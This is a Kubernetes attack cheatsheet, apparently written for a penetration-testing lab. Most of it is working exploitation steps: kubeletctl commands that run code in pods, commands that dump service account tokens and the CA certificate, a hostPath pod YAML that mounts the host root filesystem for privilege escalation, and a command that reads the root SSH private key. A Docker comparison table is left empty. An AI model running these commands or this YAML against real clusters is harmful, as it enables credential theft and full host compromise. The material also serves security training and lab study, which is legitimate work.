# Kubernetes (K8s) Cheatsheet

## Core Kubernetes Recon & Exploitation Commands

|Command|Purpose|Explanation|
|---|---|---|
|`curl https://10.129.10.11:6443 -k`|Access Kubernetes API server|Sends HTTPS request to K8s API server running on port `6443` while ignoring SSL verification using `-k`|
|`curl https://10.129.10.11:10250/pods -k \| jq .`|Enumerate pods from Kubelet API|Queries Kubelet API on port `10250` and formats JSON output using `jq`|
|`kubeletctl -i --server 10.129.10.11 pods`|List pods|Enumerates pods running on the Kubernetes node|
|`kubeletctl -i --server 10.129.10.11 scan rce`|Scan for RCE capability|Detects pods vulnerable to remote command execution|
|`kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx`|Execute command inside container|Runs `id` command inside `nginx` container of pod `nginx`|
|`kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx \| tee -a k8.token`|Extract service account token|Dumps Kubernetes token from container and saves into `k8.token`|
|`kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx \| tee -a ca.crt`|Extract cluster certificate|Retrieves Kubernetes CA certificate|
|`export token=\`cat k8.token``|Store token in variable|Saves token into shell variable|
|`kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list`|Enumerate permissions|Lists RBAC permissions for compromised service account|
|`kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml`|Create malicious pod|Deploys pod using crafted YAML|
|`kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods`|Check pod status|Lists running pods|
|`kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc`|Read root SSH key|Extracts root private SSH key from mounted host filesystem|

# Kubernetes Architecture Notes

## What is Kubernetes?

- Kubernetes (K8s) is an open-source container orchestration platform.
    
- Developed by Google.
    
- Used for:
    
    - Container deployment
        
    - Scaling
        
    - Automation
        
    - Service management
        
    - Load balancing
        
    - Self-healing

|Function|Docker|Kubernetes|

# Remote Command Execution (RCE)

## Execute Commands

```bash
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

## Result

```bash
uid=0(root) gid=0(root)
```

### Meaning

- Container runs as root.
    
- High privilege access achieved.

# Privilege Escalation via HostPath Mount

## Malicious YAML

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

---

# Why This YAML is Dangerous

|Option|Impact|
|---|---|
|`hostPath: /`|Mounts host root filesystem|
|`mountPath: /root`|Host filesystem accessible in container|
|`hostNetwork: true`|Shares host networking|
|`automountServiceAccountToken: true`|Automatically injects token|

---
